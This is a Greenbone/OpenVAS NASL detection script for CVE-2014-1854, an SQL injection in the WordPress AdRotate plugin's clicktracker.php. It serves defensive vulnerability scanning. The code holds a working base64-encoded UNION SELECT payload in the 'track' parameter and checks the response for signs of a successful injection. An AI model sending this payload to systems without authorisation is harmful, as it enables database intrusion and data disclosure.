# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804511");
  script_version("2023-07-26T05:05:09+0000");
  script_cve_id("CVE-2014-1854");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-07-26 05:05:09 +0000 (Wed, 26 Jul 2023)");
  script_tag(name:"creation_date", value:"2014-03-11 11:17:52 +0530 (Tue, 11 Mar 2014)");
  script_name("WordPress AdRotate Plugin 'clicktracker.php' SQL Injection Vulnerability");

  script_tag(name:"summary", value:"WordPress AdRotate Plugin is prone to an SQL injection (SQLi) vulnerability.");
  script_tag(name:"vuldetect", value:"Send a crafted exploit string via HTTP GET request and check whether it is
possible to execute sql query or not.");
  script_tag(name:"insight", value:"Flaw is due to the library/clicktracker.php script not properly sanitizing
user-supplied input to the 'track' parameter.");
  script_tag(name:"impact", value:"Successful exploitation will allow attacker to inject or manipulate SQL
queries in the back-end database, allowing for the manipulation or disclosure
of arbitrary data.");
  script_tag(name:"affected", value:"WordPress AdRotate Pro plugin version 3.9 through 3.9.5 and AdRotate Free
plugin version 3.9 through 3.9.4");
  script_tag(name:"solution", value:"Upgrade AdRotate Pro to version 3.9.6 or higher and AdRotate Free to version
3.9.5 or higher.");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://secunia.com/advisories/57079");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/65709");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/31834");
  script_xref(name:"URL", value:"https://www.htbridge.com/advisory/HTB23201");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/125330");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_mandatory_keys("wordpress/http/detected");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/wp-content/plugins/adrotate/library/clicktracker.php?track=LTEgVU5JT04gU0VMRUNUIHZlcnNpb24oKSwxLDEsMQ==";
req = http_get(item:url, port:port);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if(res && res =~ "^HTTP/1\.[01] 302" && res =~ "Location: ([0-9.]+)") {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
